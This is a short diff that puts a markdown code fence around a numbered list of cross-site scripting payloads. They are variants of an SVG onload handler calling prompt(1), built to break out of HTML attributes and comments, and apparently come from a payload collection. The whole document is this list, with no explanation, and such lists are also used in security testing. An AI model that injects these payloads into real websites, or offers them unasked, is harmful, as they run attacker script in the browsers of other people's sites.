@@ -1,3 +1,5 @@
+``` python
+
 0 ) "><svg/onload=prompt(1)>
 
 1 ) <svg/onload=prompt(1)
@@ -6,3 +8,4 @@
 
 3 ) --!><svg/onload=prompt(1)
 
+```
